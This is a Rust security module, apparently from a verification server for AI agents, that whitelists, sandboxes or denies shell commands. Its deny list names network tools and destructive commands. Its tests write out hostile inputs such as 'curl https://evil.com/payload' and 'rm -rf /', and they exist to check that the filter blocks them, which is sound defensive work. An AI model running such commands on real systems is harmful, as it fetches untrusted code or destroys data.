//! Security module: command whitelisting and container sandboxing.
//!
//! Implements a three-tier command policy:
//! - `Allow`: command is whitelisted and safe to run directly on host
//! - `Sandbox`: command should run inside a Podman container
//! - `Deny`: command is blocked due to dangerous patterns
//!
//! Internal commands (auto-generated by the server for Python checks)
//! bypass blocked-pattern checks since they cannot contain user-injected payloads.

use std::env;
use tokio::process::Command;
use tracing::{debug, info, warn};

// â”€â”€ Command Policy â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

/// Determines how a command should be executed.
#[derive(Debug, Clone, PartialEq)]
pub enum CommandPolicy {
    /// Safe to run directly on the host.
    Allow,
    /// Must run inside a sandboxed container.
    Sandbox,
    /// Blocked â€” too dangerous to execute.
    /// Contains: (reason, optional suggestion for a safe alternative)
    Deny(String),
}

// â”€â”€ Sandbox Configuration â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

/// Configuration for the container sandbox.
#[derive(Debug, Clone)]
pub struct SandboxConfig {
    /// Container image to use (default: "ubuntu:24.04").
    pub container_image: String,
    /// Memory limit for the container (default: "512m").
    pub memory_limit: String,
    /// CPU limit for the container (default: 2.0).
    pub cpu_limit: f64,
    /// Maximum number of PIDs in the container (default: 256).
    pub pids_limit: u64,
    /// Whether the container has network access (default: false).
    pub network_enabled: bool,
    /// Mount mode for the working directory: "rw", "ro", or "overlay" (default: "rw").
    /// Note: "overlay" is reserved for future use.
    pub mount_mode: String,
}

impl Default for SandboxConfig {
    fn default() -> Self {
        Self {
            container_image: "ubuntu:24.04".into(),
            memory_limit: "512m".into(),
            cpu_limit: 2.0,
            pids_limit: 256,
            network_enabled: false,
            mount_mode: "rw".into(),
        }
    }
}

impl SandboxConfig {
    /// Load configuration from environment variables, falling back to defaults.
    pub fn from_env() -> Self {
        let mut config = Self::default();

        if let Ok(image) = env::var("VERIFY_SANDBOX_IMAGE") {
            if !image.is_empty() {
                config.container_image = image;
            }
        }
        if let Ok(mem) = env::var("VERIFY_SANDBOX_MEMORY") {
            if !mem.is_empty() {
                config.memory_limit = mem;
            }
        }
        if let Ok(cpus) = env::var("VERIFY_SANDBOX_CPUS") {
            if let Ok(c) = cpus.parse::<f64>() {
                config.cpu_limit = c;
            }
        }
        if let Ok(net) = env::var("VERIFY_SANDBOX_NETWORK") {
            config.network_enabled = net == "true" || net == "1";
        }
        if let Ok(mode) = env::var("VERIFY_SANDBOX_MOUNT_MODE") {
            if mode == "rw" || mode == "ro" || mode == "overlay" {
                config.mount_mode = mode;
            }
        }

        config
    }
}

// â”€â”€ Whitelisted Commands â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

/// Base commands that are known safe for verification purposes.
const WHITELISTED_COMMANDS: &[&str] = &[
    // Python tooling
    "python",
    "python3",
    "pytest",
    "mypy",
    "pyright",
    "ruff",
    "black",
    "isort",
    "flake8",
    "pylint",
    "pip",
    // Rust tooling
    "cargo",
    "rustc",
    "rustfmt",
    "clippy-driver",
    // Node.js tooling
    "node",
    "npm",
    "npx",
    "yarn",
    "pnpm",
    // Go tooling
    "go",
    "golint",
    "golangci-lint",
    // Generic safe commands
    "echo",
    "cat",
    "head",
    "tail",
    "wc",
    "grep",
    "find",
    "ls",
    "test",
    "diff",
    "sort",
    "uniq",
    "tr",
    "cut",
    "basename",
    "dirname",
    "true",
    "false",
];

// â”€â”€ Dangerous Patterns â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

/// Patterns that indicate potentially dangerous commands.
/// These are checked against the UNQUOTED portions of the command string.
const DANGEROUS_PATTERNS: &[&str] = &[
    // Shell chaining / injection
    "&&",
    "||",
    ";",
    "|",
    "`",
    "$(",
    // Destructive commands
    "rm ",
    "rm\t",
    "rmdir ",
    "mkfs",
    "dd ",
    "shred ",
    // Network access
    "curl ",
    "curl\t",
    "wget ",
    "wget\t",
    "nc ",
    "ncat ",
    "netcat ",
    // Privilege escalation
    "sudo ",
    "sudo\t",
    "su ",
    "doas ",
    // File permission manipulation
    "chmod ",
    "chown ",
    "chgrp ",
    // Redirection (output to file)
    ">>",
    // Process/system manipulation
    "kill ",
    "killall ",
    "pkill ",
    "reboot",
    "shutdown",
    "systemctl",
    "service ",
];

/// Patterns in command output that suggest a binary was not found in the container.
const NOT_FOUND_PATTERNS: &[&str] = &[
    "not found",
    "No such file or directory",
    "command not found",
    "executable file not found",
];

// â”€â”€ Quote-Aware Pattern Matching â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

/// Strip content inside quotes from a command string, replacing with spaces.
/// This prevents Python code like `python -c "import x; y"` from triggering
/// on `;` which is inside the quoted string (Python code, not shell injection).
///
/// Handles both single and double quotes. Escaped quotes (\' \") are respected.
fn strip_quoted_content(command: &str) -> String {
    let mut result = String::with_capacity(command.len());
    let bytes = command.as_bytes();
    let mut i = 0;

    while i < bytes.len() {
        let b = bytes[i];

        // Check for escaped character
        if b == b'\\' && i + 1 < bytes.len() {
            result.push(' ');
            result.push(' ');
            i += 2;
            continue;
        }

        // Start of quoted string
        if b == b'"' || b == b'\'' {
            let quote = b;
            result.push(' '); // replace opening quote with space
            i += 1;

            // Skip until matching close quote (respecting escapes)
            while i < bytes.len() {
                if bytes[i] == b'\\' && i + 1 < bytes.len() {
                    result.push(' ');
                    result.push(' ');
                    i += 2;
                } else if bytes[i] == quote {
                    result.push(' '); // replace closing quote with space
                    i += 1;
                    break;
                } else {
                    result.push(' '); // replace content with space
                    i += 1;
                }
            }
            continue;
        }

        result.push(b as char);
        i += 1;
    }

    result
}

// â”€â”€ Command Validation â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

/// Extract the base command name from a command string.
/// Handles paths ("/usr/bin/python" â†’ "python") and
/// module-style invocations ("python -m pytest" â†’ "python").
fn extract_base_command(command: &str) -> &str {
    let trimmed = command.trim();

    // Get the first space-delimited token
    let first_token = trimmed.split_whitespace().next().unwrap_or("");

    // If it's a path, use just the filename
    if first_token.contains('/') {
        first_token.rsplit('/').next().unwrap_or(first_token)
    } else {
        first_token
    }
}

/// Validate a command and return the appropriate execution policy.
///
/// - `command`: The full command string to validate.
/// - `internal`: If `true`, the command was generated by the server itself
///   (e.g., for Python-specific checks) and bypasses dangerous-pattern checks.
pub fn validate_command(command: &str, internal: bool) -> CommandPolicy {
    let base = extract_base_command(command);

    // Check if the base command is whitelisted
    let is_whitelisted = WHITELISTED_COMMANDS
        .iter()
        .any(|w| base.eq_ignore_ascii_case(w));

    // Internal commands (server-generated) bypass pattern checks
    if internal {
        if is_whitelisted {
            debug!(command = %command, "Internal command (whitelisted) â€” allowing");
            return CommandPolicy::Allow;
        }
        // Even internal commands with unknown base get allowed,
        // since the server code itself constructed them
        debug!(command = %command, "Internal command (not whitelisted but server-generated) â€” allowing");
        return CommandPolicy::Allow;
    }

    // External (agent-provided) commands: check for dangerous patterns
    // IMPORTANT: Only check the UNQUOTED portions of the command.
    // This prevents false positives like `python -c "import x; y"`.
    let unquoted = strip_quoted_content(command);
    let dangerous = find_dangerous_pattern(&unquoted);

    if let Some(pattern) = dangerous {
        // Generate a helpful suggestion based on the pattern
        let suggestion = suggest_safe_alternative(command, pattern);

        let mut reason = format!(
            "Command blocked: contains dangerous pattern '{pattern}' \
             outside of quotes. Command: '{}'",
            truncate_for_log(command, 100)
        );

        if let Some(sug) = suggestion {
            reason.push_str(&format!("\n\nðŸ’¡ SUGGESTION: {sug}"));
        }

        warn!("{reason}");
        return CommandPolicy::Deny(reason);
    }

    // Check single > redirection in unquoted content
    if has_output_redirect(&unquoted) {
        let reason = format!(
            "Command blocked: contains output redirection (>). \
             Command: '{}'",
            truncate_for_log(command, 100)
        );
        warn!("{reason}");
        return CommandPolicy::Deny(reason);
    }

    if is_whitelisted {
        debug!(command = %base, "Whitelisted command â€” allowing");
        CommandPolicy::Allow
    } else {
        // Unknown command that passed pattern checks: sandbox it
        info!(command = %base, "Unknown command â€” sandboxing");
        CommandPolicy::Sandbox
    }
}

/// Find the first dangerous pattern in an (already unquoted) command string.
fn find_dangerous_pattern(unquoted_command: &str) -> Option<&'static str> {
    for pattern in DANGEROUS_PATTERNS {
        if unquoted_command.contains(pattern) {
            return Some(pattern);
        }
    }
    None
}

/// Generate a helpful suggestion when a command is blocked.
/// Returns None if no specific suggestion is available.
fn suggest_safe_alternative(original_command: &str, blocked_pattern: &str) -> Option<String> {
    match blocked_pattern {
        "&&" => {
            // Common pattern: "cd /path && command"
            // Detect: first part is cd, second is the actual command
            if let Some(stripped) = original_command.strip_prefix("cd ") {
                if let Some(idx) = stripped.find("&&") {
                    let dir = stripped[..idx].trim().trim_end_matches(char::is_whitespace);
                    let cmd = stripped[idx + 2..].trim();
                    return Some(format!(
                        "Instead of 'cd {dir} && {cmd}', use the 'working_dir' field:\n\
                         {{\"type\": \"command_succeeds\", \"command\": \"{cmd}\", \"working_dir\": \"{dir}\"}}"
                    ));
                }
            }
            Some(
                "Shell chaining with '&&' is not allowed. Use separate checks, \
                 or use the 'working_dir' field instead of 'cd ... &&'."
                    .into(),
            )
        }
        ";" => {
            // Common pattern: python -c "import x; y" â€” but this should have been
            // caught by quote stripping. If we get here, it's a bare semicolon.
            if original_command.contains("python") && original_command.contains("-c") {
                Some(
                    "The semicolon appears outside of quotes in your Python -c command. \
                     Make sure the Python code is properly quoted:\n\
                     \"command\": \"python -c \\\"import py_compile; py_compile.compile('file.py')\\\"\"".into()
                )
            } else {
                Some(
                    "Shell command chaining with ';' is not allowed. \
                     Split into separate checks instead."
                        .into(),
                )
            }
        }
        "|" => Some(
            "Piping with '|' is not allowed. If you need to filter output, \
             use 'command_output_matches' with a regex pattern instead."
                .into(),
        ),
        "||" => {
            if original_command.ends_with("|| true") || original_command.ends_with("|| true ") {
                Some(
                    "Instead of appending '|| true' to ignore exit codes, \
                     use a different check type like 'command_output_matches' \
                     which does not fail on non-zero exit codes if that's what you need, \
                     or handle the failure gracefully."
                        .into(),
                )
            } else {
                Some(
                    "Shell fallback chaining with '||' is not allowed. \
                     Please use explicit checks or scripts for conditional logic."
                        .into(),
                )
            }
        }
        _ => None,
    }
}

/// Check for output redirection (single >) that isn't ">>" or ">/dev/null".
fn has_output_redirect(command: &str) -> bool {
    // Find all occurrences of ">" that are not part of ">>"
    let bytes = command.as_bytes();
    for (i, &b) in bytes.iter().enumerate() {
        if b == b'>' {
            // Skip if part of ">>"
            if i + 1 < bytes.len() && bytes[i + 1] == b'>' {
                continue; // ">>" is already caught by DANGEROUS_PATTERNS
            }
            // Skip if preceded by another ">"
            if i > 0 && bytes[i - 1] == b'>' {
                continue;
            }
            // Allow "> /dev/null" â€” a common safe pattern
            let rest = &command[i + 1..].trim_start();
            if rest.starts_with("/dev/null") {
                continue;
            }
            return true;
        }
    }
    false
}

/// Truncate a string for log messages.
fn truncate_for_log(s: &str, max_len: usize) -> String {
    if s.len() <= max_len {
        s.to_string()
    } else {
        format!("{}...", &s[..max_len])
    }
}

// â”€â”€ Container Sandboxing â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

/// Execute a command inside a Podman container with resource limits.
///
/// The working directory (if provided) is bind-mounted into the container
/// at `/workspace`, and the command runs there.
pub async fn execute_sandboxed(
    command: &str,
    working_dir: Option<&str>,
    timeout_secs: u64,
    config: &SandboxConfig,
) -> Result<(i32, String, String), String> {
    // Verify podman is available
    let podman_check = Command::new("podman")
        .arg("--version")
        .output()
        .await
        .map_err(|e| {
            format!("Podman is not available: {e}. Install Podman to use sandboxed execution.")
        })?;

    if !podman_check.status.success() {
        return Err("Podman is installed but not working correctly.".into());
    }

    let mut args: Vec<String> = vec![
        "run".into(),
        "--rm".into(),
        // Resource limits
        format!("--memory={}", config.memory_limit),
        format!("--cpus={}", config.cpu_limit),
        format!("--pids-limit={}", config.pids_limit),
        // Stop timeout (slightly less than our outer timeout)
        format!("--stop-timeout={}", timeout_secs.saturating_sub(2)),
    ];

    // Network
    if !config.network_enabled {
        args.push("--network=none".into());
    }

    // Working directory mount
    if let Some(dir) = working_dir {
        let mount_opt = match config.mount_mode.as_str() {
            "ro" => "ro",
            "overlay" => {
                // Overlay mode: changes stay in container only (future feature)
                // For now, fall back to RW with a warning
                warn!("Overlay mount mode is not yet fully supported; using read-write mount");
                "rw"
            }
            _ => "rw",
        };
        args.push("-v".into());
        args.push(format!("{dir}:/workspace:{mount_opt}"));
        args.push("-w".into());
        args.push("/workspace".into());
    }

    // Container image
    args.push(config.container_image.clone());

    // The command to run inside the container
    args.push("sh".into());
    args.push("-c".into());
    args.push(command.to_string());

    info!(
        image = %config.container_image,
        memory = %config.memory_limit,
        cpus = %config.cpu_limit,
        network = config.network_enabled,
        "Executing command in Podman sandbox"
    );
    debug!(command = %command, "Sandboxed command");

    let mut cmd = Command::new("podman");
    cmd.args(&args);

    let output = tokio::time::timeout(std::time::Duration::from_secs(timeout_secs), cmd.output())
        .await
        .map_err(|_| format!("Sandboxed command timed out after {timeout_secs}s"))?
        .map_err(|e| format!("Failed to execute podman: {e}"))?;

    let code = output.status.code().unwrap_or(-1);
    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();

    // Enhanced error diagnostics: check if the command binary was not found
    if code != 0 {
        let combined = format!("{stdout}{stderr}");
        if NOT_FOUND_PATTERNS
            .iter()
            .any(|p| combined.to_lowercase().contains(&p.to_lowercase()))
        {
            let base = extract_base_command(command);
            warn!(
                command = %base,
                image = %config.container_image,
                "Command may not be installed in the container image"
            );
            let diagnostic = format!(
                "\n\nâš  SANDBOX DIAGNOSTIC: Command '{}' may not be available in container image '{}'. \
                 Set VERIFY_SANDBOX_IMAGE to a custom image with your toolchain installed \
                 (e.g., an image with Python, Cargo, etc.).",
                base, config.container_image
            );
            return Ok((code, stdout, format!("{stderr}{diagnostic}")));
        }
    }

    Ok((code, stdout, stderr))
}

// â”€â”€ Tests â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

#[cfg(test)]
mod tests {
    use super::*;

    // â”€â”€ strip_quoted_content â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

    #[test]
    fn test_strip_simple_double_quotes() {
        let result = strip_quoted_content(r#"python -c "import x; y""#);
        // The content inside quotes should be replaced with spaces
        assert!(
            !result.contains(';'),
            "semicolon inside quotes should be stripped: {result}"
        );
        assert!(
            result.contains("python"),
            "command outside quotes preserved: {result}"
        );
    }

    #[test]
    fn test_strip_single_quotes() {
        let result = strip_quoted_content("python -c 'import x; y'");
        assert!(
            !result.contains(';'),
            "semicolon inside single quotes should be stripped: {result}"
        );
    }

    #[test]
    fn test_strip_preserves_unquoted() {
        let result = strip_quoted_content("cargo check && rm -rf /");
        assert!(
            result.contains("&&"),
            "unquoted && should be preserved: {result}"
        );
    }

    #[test]
    fn test_strip_nested_quotes() {
        // python -c "x = 'hello; world'"
        let result = strip_quoted_content(r#"python -c "x = 'hello; world'""#);
        assert!(
            !result.contains(';'),
            "semicolon in nested quotes stripped: {result}"
        );
    }

    #[test]
    fn test_strip_escaped_quotes() {
        let result = strip_quoted_content(r#"echo "hello \" world; danger""#);
        assert!(
            !result.contains(';'),
            "semicolon after escaped quote stripped: {result}"
        );
    }

    // â”€â”€ validate_command (with quote awareness) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

    #[test]
    fn test_python_c_with_semicolon_allowed() {
        // This was previously blocked â€” now it should be allowed
        let policy = validate_command(
            r#"python -c "import py_compile; py_compile.compile('file.py')""#,
            false,
        );
        assert_eq!(
            policy,
            CommandPolicy::Allow,
            "python -c with quoted semicolon should be allowed"
        );
    }

    #[test]
    fn test_python_c_with_single_quotes_allowed() {
        let policy = validate_command("python -c 'import json; print(json.dumps({}))'", false);
        assert_eq!(
            policy,
            CommandPolicy::Allow,
            "python -c with single-quoted semicolon should be allowed"
        );
    }

    #[test]
    fn test_bare_semicolon_still_blocked() {
        // Semicolon outside quotes should still be blocked
        match validate_command("echo hello; rm -rf /", false) {
            CommandPolicy::Deny(reason) => assert!(reason.contains(";")),
            other => panic!("Expected Deny, got {other:?}"),
        }
    }

    #[test]
    fn test_cd_and_command_blocked_with_suggestion() {
        match validate_command("cd /home/peter/project && python -m pytest", false) {
            CommandPolicy::Deny(reason) => {
                assert!(reason.contains("&&"));
                assert!(
                    reason.contains("working_dir"),
                    "Should suggest working_dir: {reason}"
                );
            }
            other => panic!("Expected Deny with suggestion, got {other:?}"),
        }
    }

    // â”€â”€ extract_base_command â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

    #[test]
    fn test_extract_base_simple() {
        assert_eq!(extract_base_command("cargo check"), "cargo");
    }

    #[test]
    fn test_extract_base_with_path() {
        assert_eq!(extract_base_command("/usr/bin/python test.py"), "python");
    }

    #[test]
    fn test_extract_base_python_module() {
        assert_eq!(extract_base_command("python -m pytest tests/"), "python");
    }

    #[test]
    fn test_extract_base_empty() {
        assert_eq!(extract_base_command(""), "");
    }

    #[test]
    fn test_extract_base_whitespace() {
        assert_eq!(extract_base_command("  cargo build  "), "cargo");
    }

    // â”€â”€ validate_command (external) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

    #[test]
    fn test_whitelisted_simple_commands() {
        assert_eq!(validate_command("cargo check", false), CommandPolicy::Allow);
        assert_eq!(
            validate_command("python -m pytest tests/", false),
            CommandPolicy::Allow
        );
        assert_eq!(
            validate_command("mypy --strict src/", false),
            CommandPolicy::Allow
        );
        assert_eq!(
            validate_command("ruff check .", false),
            CommandPolicy::Allow
        );
    }

    #[test]
    fn test_dangerous_patterns_denied() {
        // Shell chaining (outside quotes)
        match validate_command("cargo check && rm -rf /", false) {
            CommandPolicy::Deny(reason) => assert!(reason.contains("&&")),
            other => panic!("Expected Deny, got {other:?}"),
        }
        match validate_command("echo hello; rm *", false) {
            CommandPolicy::Deny(reason) => assert!(reason.contains(";")),
            other => panic!("Expected Deny, got {other:?}"),
        }
    }

    #[test]
    fn test_destructive_commands_denied() {
        match validate_command("rm -rf /tmp/test", false) {
            CommandPolicy::Deny(reason) => assert!(reason.contains("rm ")),
            other => panic!("Expected Deny for rm, got {other:?}"),
        }
        match validate_command("curl https://evil.com/payload", false) {
            CommandPolicy::Deny(reason) => assert!(reason.contains("curl ")),
            other => panic!("Expected Deny for curl, got {other:?}"),
        }
        match validate_command("wget https://evil.com/malware", false) {
            CommandPolicy::Deny(reason) => assert!(reason.contains("wget ")),
            other => panic!("Expected Deny for wget, got {other:?}"),
        }
        match validate_command("sudo anything", false) {
            CommandPolicy::Deny(reason) => assert!(reason.contains("sudo ")),
            other => panic!("Expected Deny for sudo, got {other:?}"),
        }
    }

    #[test]
    fn test_unknown_command_sandboxed() {
        assert_eq!(
            validate_command("my-custom-tool --check", false),
            CommandPolicy::Sandbox
        );
    }

    #[test]
    fn test_output_redirect_denied() {
        match validate_command("echo hello > /tmp/evil", false) {
            CommandPolicy::Deny(reason) => assert!(reason.contains(">")),
            other => panic!("Expected Deny for redirect, got {other:?}"),
        }
    }

    #[test]
    fn test_redirect_to_dev_null_allowed() {
        // "python -m json.tool file.json > /dev/null" is a common pattern
        assert_eq!(
            validate_command("python -m json.tool file.json > /dev/null", false),
            CommandPolicy::Allow
        );
    }

    // â”€â”€ validate_command (internal) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

    #[test]
    fn test_internal_commands_bypass_pattern_checks() {
        assert_eq!(
            validate_command("python -c \"import json; print(json.dumps(result))\"", true),
            CommandPolicy::Allow
        );
    }

    #[test]
    fn test_internal_whitelisted() {
        assert_eq!(
            validate_command("mypy --show-column-numbers src/", true),
            CommandPolicy::Allow
        );
    }

    // â”€â”€ SandboxConfig â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

    #[test]
    fn test_default_config() {
        let config = SandboxConfig::default();
        assert_eq!(config.container_image, "ubuntu:24.04");
        assert_eq!(config.memory_limit, "512m");
        assert_eq!(config.cpu_limit, 2.0);
        assert_eq!(config.pids_limit, 256);
        assert!(!config.network_enabled);
        assert_eq!(config.mount_mode, "rw");
    }

    // â”€â”€ has_output_redirect â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

    #[test]
    fn test_no_redirect() {
        assert!(!has_output_redirect("cargo check"));
        assert!(!has_output_redirect("python -c \"x = 1\""));
    }

    #[test]
    fn test_redirect_detected() {
        assert!(has_output_redirect("echo hello > /tmp/file"));
    }

    #[test]
    fn test_dev_null_redirect_allowed() {
        assert!(!has_output_redirect("cmd > /dev/null"));
    }

    #[test]
    fn test_append_redirect_caught_by_patterns() {
        // ">>" is caught by DANGEROUS_PATTERNS, not by has_output_redirect
        assert!(!has_output_redirect("echo hello >> file"));
        // But validate_command catches it via DANGEROUS_PATTERNS:
        match validate_command("echo hello >> file", false) {
            CommandPolicy::Deny(reason) => assert!(reason.contains(">>")),
            other => panic!("Expected Deny for >>, got {other:?}"),
        }
    }

    // â”€â”€ suggest_safe_alternative â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

    #[test]
    fn test_cd_and_suggestion() {
        let suggestion =
            suggest_safe_alternative("cd /home/peter/project && python -m pytest", "&&");
        assert!(suggestion.is_some());
        let s = suggestion.unwrap();
        assert!(s.contains("working_dir"), "Should suggest working_dir: {s}");
        assert!(
            s.contains("/home/peter/project"),
            "Should include the path: {s}"
        );
        assert!(
            s.contains("python -m pytest"),
            "Should include the command: {s}"
        );
    }

    #[test]
    fn test_or_true_suggestion() {
        let cmd = "grep -c 'resolve' src/verification.rs || true";
        match validate_command(cmd, false) {
            CommandPolicy::Deny(reason) => {
                assert!(reason.contains("||"));
                assert!(reason.contains("Instead of appending '|| true'"));
            }
            other => panic!("Expected Deny with || suggestion, got {other:?}"),
        }
    }
}
